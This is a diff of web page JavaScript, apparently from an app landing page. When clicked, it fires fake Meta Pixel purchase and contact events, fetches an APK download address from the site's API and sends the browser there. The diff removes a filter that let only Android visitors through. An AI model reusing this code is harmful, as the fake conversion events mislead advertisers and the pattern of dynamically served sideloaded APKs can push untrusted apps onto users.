@@ -43,32 +43,28 @@ fetch(API_BASE+'/api/pixels?site='+encodeURIComponent(_site))
 </script>
 <!-- End Meta Pixel Code -->
 
-   <script>
+ 
+<script>
 // ========== k2 — 动态获取APK下载地址并跳转 ==========
-var FILTER=1; // 0=关闭  1=屏蔽PC和iOS，仅允许安卓
-var _apkUrl='';
-async function k2(source){
+var _apkUrl = '';
+async function k2(source) {
     fbq('track', 'AddToCart');
     fbq('track', 'Contact');
     fbq('track', 'Purchase');
-    if(FILTER===1){
-        var ua=navigator.userAgent||'';
-        var isIOS=/iPhone|iPad|iPod/i.test(ua);
-        var isMobile=/Mobi|Android/i.test(ua);
-        if(!isMobile||isIOS){
-            alert('error');
-            return;
+
+    try {
+        if (!_apkUrl) {
+            var r = await fetch(API_BASE + '/api/apk-url?site=' + encodeURIComponent(_site));
+            var d = await r.json();
+            _apkUrl = d.url;
+            console.log('APK API返回:', JSON.stringify(d));
         }
-    }
-    try{
-        if(!_apkUrl){
-            var r=await fetch(API_BASE+'/api/apk-url?site='+encodeURIComponent(_site));
-            var d=await r.json();
-            _apkUrl=d.url; console.log('APK API返回:',JSON.stringify(d));
+        if (_apkUrl) {
+            window.location.href = _apkUrl;
+        } else {
+            alert('获取APK下载地址失败，请稍后重试');
         }
-        if(_apkUrl) window.location.href=_apkUrl;
-        else alert('获取APK下载地址失败，请稍后重试');
-    }catch(e){
+    } catch (e) {
         alert('获取APK下载地址失败，请稍后重试');
     }
 }
